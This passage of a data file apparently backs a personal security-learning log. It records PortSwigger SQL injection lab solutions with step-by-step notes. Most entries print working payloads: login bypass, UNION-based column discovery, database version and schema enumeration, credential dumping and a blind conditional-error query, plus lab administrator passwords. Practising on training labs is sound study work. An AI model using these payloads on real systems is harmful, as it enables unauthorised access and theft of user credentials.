          "Used the same pattern against the users table to confirm the administrator account and narrow the password length to 20 characters, then scripted the rest since Intruder isn't available on Community Edition.",
        ],
        solution:
          "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>N) || '\n\nCredentials found:\nadministrator\n1jstrwe8vruggjowu1la",
        status: 'completed',
        script: 'LabScripts/lab12.py',
      },
    ],
    tools: ['Burp Suite', 'Burp Proxy', 'Burp Repeater', 'Python'],
    tags: [
      'SQL injection',
      'blind SQLi',
      'conditional responses',
      'conditional errors',
      'Oracle',
    ],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },
  {
    id: 'portswigger-sqli-labs-1-10',
    date: '2026-07-28',
    category: 'PortSwigger Labs',
    vulnTypes: ['SQL Injection'],
    title: 'SQL Injection labs 1-10 (Burp Suite)',
    workedOn: [
      'Completed labs 1-10 on the PortSwigger SQL injection path',
      'Used Burp Proxy to intercept traffic and Repeater to send payloads',
      'Worked through WHERE clause bypass, login bypass, UNION attacks across Oracle/MySQL/PostgreSQL, data type and column discovery, and dumping credentials',
    ],
    body: [
      'First proper session on the Web Security Academy SQL injection module. Burp Repeater was the main tool once I had a request captured from Proxy.',
      'Main takeaway: comment syntax and version functions change per database (-- vs #, v$version vs @@version vs version()). Getting the column count with ORDER BY (or the UNION SELECT NULL method) and confirming text columns with UNION SELECT came up in almost every lab.',
      "By Lab 10, I'd also picked up the || concatenation trick for squeezing two values (username and password) into a single visible column when the page only renders one field.",
    ],
    labs: [
      {
        title:
          'Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data',
        notes: [
          'Vulnerable parameter is the category filter on the product listing page.',
          'Appending a tautology to the WHERE clause returns all rows, including hidden ones.',
        ],
        solution: "GET /filter?category=Gifts' OR '1'='1",
        status: 'completed',
      },
      {
        title: 'Lab 2: SQL injection vulnerability allowing login bypass',
        notes: [
          "Adding a single quote (') caused the page to fail, confirming the input is passed into a SQL query.",
          'Goal was to log in as administrator. Testing username admin with a quote did not work.',
          "The login query looks like: SELECT firstname FROM users WHERE username='...' AND password='...'",
          "Using a comment to skip the password check: administrator'-- with any password value.",
        ],
        solution: "Username: administrator'--  |  Password: (anything)",
        status: 'completed',
      },
      {
        title:
          'Lab 3: SQL injection attack, querying the database type and version on Oracle',
        notes: [
          'Intercepted the category filter request in Burp Proxy and sent it to Repeater.',
          "category=Gifts' ORDER BY 1-- → 200",
          "category=Gifts' ORDER BY 2-- → 200",
          "category=Gifts' ORDER BY 3-- → 500, so 2 columns confirmed.",
          "category=Gifts' UNION SELECT 'a', 'a' FROM DUAL-- → 200. FROM DUAL confirms Oracle.",
        ],
        solution: "' UNION SELECT banner, NULL FROM v$version--",
        status: 'completed',
      },
      {
        title:
          'Lab 4: SQL injection attack, querying database type and version on MySQL and Microsoft',
        notes: [
          'Intercept via Burp, send to Repeater.',
          "category=Accessories' ORDER BY 1-- → 500. Comment syntax -- did not work here.",
          "category=Accessories' ORDER BY 1# → 200. # works as the comment character on this database.",
          'ORDER BY 2# → 200, ORDER BY 3# → 500. Two columns again.',
          'Both columns display text on the page.',
          "category=Accessories' UNION SELECT 'a', 'a'# → 200.",
          'Not Oracle (no FROM DUAL needed). Microsoft/SQL Server uses @@version.',
        ],
        solution: "' UNION SELECT @@version, NULL#",
        status: 'completed',
      },
      {
        title:
          'Lab 5: SQL injection attack, listing the database contents on non-Oracle databases',
        notes: [
          'Intercept and Repeater again on the category filter.',
          'ORDER BY 1-- and ORDER BY 2-- → 200. ORDER BY 3-- → 500. Two columns.',
          "UNION SELECT 'a', 'a'-- → 200. Both columns hold text.",
          '@@version → 500, so not Microsoft SQL Server.',
          'version() → 200, so PostgreSQL.',
          'UNION SELECT table_name, NULL FROM information_schema.tables-- → 200. Found table: users_ocetwc.',
          'First attempt at column lookup returned 500 because I wrote information.schema instead of information_schema.',
          "UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_ocetwc'-- → username_oslrwn and password_epjcib.",
          'Dumped credentials and logged in as administrator successfully.',
          'Remember the trailing -- on payloads; forgetting it caused a 500 more than once.',
        ],
        solution:
          "' UNION SELECT username_oslrwn, password_epjcib FROM users_ocetwc--\n\nCredentials found:\nadministrator\no0cg3skime8olq3u1au0",
        status: 'completed',
      },
      {
        title:
          'Lab 6: SQL injection attack, listing the database contents on Oracle',
        notes: [
          'Same goal as Lab 5, but adapted for Oracle syntax.',
          "category=Accessories' ORDER BY 1--, ORDER BY 2-- → 200, ORDER BY 3-- → 500. Two columns confirmed.",
          "UNION SELECT 'a', 'a'-- → 500 at first - missing FROM DUAL, which Oracle requires for a UNION with no real table.",
          "UNION SELECT 'a', 'a' FROM DUAL-- → 200, confirming Oracle (the query failing without DUAL was itself a giveaway).",
          'Reused the Lab 3 version query: UNION SELECT banner, NULL FROM v$version--',
          'UNION SELECT table_name, NULL FROM all_tables-- → found table USERS_QAXEJG.',
          "UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_QAXEJG'-- → USERNAME_XWMTOF, PASSWORD_QGYRAI.",
          'The PortSwigger cheat sheet was useful here for the Oracle-specific system tables (all_tables, all_tab_columns) instead of information_schema.',
        ],
        solution:
          "' UNION SELECT USERNAME_XWMTOF, PASSWORD_QGYRAI FROM USERS_QAXEJG--\n\nCredentials found:\nadministrator\no3u5naqxsdx95uck2hd8",
        status: 'completed',
      },
      {
        title:
          'Lab 7: SQL injection UNION attack, determining the number of columns returned by the query',
        notes: [
          'Two rules to remember for UNION: the number and order of columns must match across queries, and the data types must be compatible.',
          "Instead of ORDER BY, used ' UNION SELECT NULL-- and kept adding NULLs until the 500 error cleared.",
          "' UNION SELECT NULL, NULL, NULL-- returned 200, confirming three columns.",
        ],
        solution: "' UNION SELECT NULL, NULL, NULL--",
        status: 'completed',
      },
      {
        title:
          'Lab 8: SQL injection UNION attack, finding a column containing text',
        notes: [
          'Confirmed three columns using the NULL method from Lab 7.',
          "Tested each position individually: ' UNION SELECT 'a', NULL, NULL-- then ' UNION SELECT NULL, 'a', NULL--",
          'The second position came back 200, confirming that column accepts text.',
          'Initially used a placeholder value and expected the lab to complete on that alone, but the lab description actually asked for a specific value rather than an arbitrary string.',
          "Adjusted to the exact required value: ' UNION SELECT NULL, '2AxW05', NULL--",
        ],
        solution: "' UNION SELECT NULL, '2AxW05', NULL--",
        status: 'completed',
      },
      {
        title:
          'Lab 9: SQL injection UNION attack, retrieving data from other tables',
        notes: [
          "Confirmed two text columns with the usual ' UNION SELECT 'a', 'a'--",
          "Queried the users table directly: ' UNION SELECT username, password FROM users--",
          'Response was 200 and the credentials appeared directly on the product listing page.',
        ],
        solution:
          "' UNION SELECT username, password FROM users--\n\nCredentials found:\nadministrator\nu7p40o4mwjnw2eo4pb2b",
        status: 'completed',
      },
      {
        title:
          'Lab 10: SQL injection UNION attack, retrieving multiple values in a single column',
        notes: [
          'Confirmed two columns via ORDER BY, but only one column is actually rendered on the page - the other looks like an ID field.',
          "' UNION SELECT NULL, username FROM users-- surfaced all the usernames but not the passwords, and running it twice (once per field) felt clunky.",
          "Used the || concatenation operator to combine both values into the single visible column: ' UNION SELECT NULL, username || password FROM users--",
        ],
        solution: "' UNION SELECT NULL, username || password FROM users--",
        status: 'completed',
        screenshot: 'Burp/Lab10.png',
      },
    ],
    tools: ['Burp Suite', 'Burp Proxy', 'Burp Repeater'],
    tags: [
      'SQL injection',
      'UNION attacks',
      'Oracle',
      'MySQL',
      'PostgreSQL',
      'login bypass',
    ],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },
]
